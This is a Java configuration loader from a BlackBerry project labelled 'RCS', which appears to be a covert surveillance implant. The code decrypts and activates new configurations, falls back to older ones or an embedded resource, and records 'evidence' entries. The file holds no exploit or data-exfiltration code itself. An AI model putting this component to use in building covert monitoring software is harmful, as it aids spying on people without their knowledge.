//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Conf.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.config;

import java.io.InputStream;

import blackberry.GeneralException;
import blackberry.Status;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.fs.AutoFile;
import blackberry.fs.Path;
import blackberry.manager.ActionManager;
import blackberry.manager.EventManager;
import blackberry.manager.ModuleManager;
import blackberry.utils.Utils;
import fake.InstanceConfigFake;

/**
 * The Class Conf. None of theese parameters changes runtime.
 */
public final class ConfLoader {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConfLoader", DebugLevel.VERBOSE);
    //#endif

    private Status status;

    private boolean haveJson;

    /**
     * Instantiates a new conf.
     */
    public ConfLoader() {
        status = Status.getInstance();
    }

    public boolean loadConf() throws GeneralException {

        status.clear();

        boolean loaded = false;
        //final byte[] confKey = Encryption.getKeys().getConfKey();

        //#ifdef DEBUG
        debug.trace("load: " + Encryption.getKeys().log);
        //#endif

        AutoFile file;

        file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
        if (file.exists()) {
            //#ifdef DEBUG
            debug.info("Try: new config");
            //#endif

            loaded = loadConfFile(file, true);

            if (loaded) {
                //#ifdef DEBUG
                debug.info("New config");
                //#endif
                file.rename(Cfg.ACTUAL_CONF, true);
                Evidence.info("New configuration activated");
                loaded = true;
            } else {
                //#ifdef DEBUG
                debug.error("Reading new configuration");
                //#endif
                file.delete();
                Evidence.info("Invalid new configuration, reverting");

            }
        }
        if (!loaded) {
            file = new AutoFile(Path.conf(), Cfg.ACTUAL_CONF);
            if (file.exists()) {
                loaded = loadConfFile(file, true);
                if (!loaded) {
                    Evidence.info("Actual configuration corrupted"); //$NON-NLS-1$
                }
            }
        }

        if (!loaded) {
            //#ifdef DEBUG
            debug.warn("Reading Conf from resources");
            //#endif

            InputStream inputStream = InstanceConfig.getConfig();
            if (inputStream != null) {
                //#ifdef DBC
                Check.asserts(inputStream != null, "Resource config");
                //#endif            

                byte[] resource;
                //#ifdef FAKECONF
                resource = InstanceConfigFake.getBytes();
                //#else
                resource = Utils.inputStreamToBuffer(inputStream, 0); // config.bin
                //#endif

                int len = Utils.byteArrayToInt(resource, 0);

                cleanConfiguration();

                // Initialize the configuration object
                Configuration conf = new Configuration(resource, len, 4);

                // Load the configuration
                loaded = conf.loadConfiguration(true);

                //#ifdef DEBUG
                debug.trace("load Info: Resource file loaded: " + loaded);
                //#endif        

            } else {
                //#ifdef DEBUG
                debug.error("Cannot read config from resources");
                //#endif
                loaded = false;
            }
        }
        return loaded;
    }

    /**
     * Clean configuration and status objects.
     */
    public void cleanConfiguration() {
        // Clean an eventual old initialization
        status.clear();
        ModuleManager.getInstance().clear();
        EventManager.getInstance().clear();
        ActionManager.getInstance().clear();
    }

    private boolean loadConfFile(byte[] resource, boolean instantiate) {
        boolean loaded = false;

        if (resource != null && resource.length > 0) {
            // Initialize the configuration object
            Configuration conf = new Configuration(resource, resource.length, 0);
            if (conf.isDecrypted()) {

                if (instantiate) {
                    cleanConfiguration();
                }

                // Load the configuration
                loaded = conf.loadConfiguration(instantiate);
                //#ifdef DEBUG
                debug.trace("loadConfFile Conf file loaded: " + loaded);
                //#endif
            }
        } else {
            //#ifdef DEBUG
            debug.trace("loadConfFile: empty resource");
            //#endif
        }

        return loaded;

    }

    public boolean loadConfFile(AutoFile file, boolean instantiate) {
        boolean loaded = false;

        //#ifdef DEBUG
        debug.trace("loadConfFile: " + file);
        //#endif

        final byte[] resource = file.read();
        return loadConfFile(resource, instantiate);

    }

    public boolean verifyNewConf() {
        //#ifdef DEBUG
        debug.trace("verifyNewConf");
        //#endif
        AutoFile file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
        boolean loaded = false;
        if (file.exists()) {
            loaded = loadConfFile(file, false);
        }

        return loaded;
    }

}
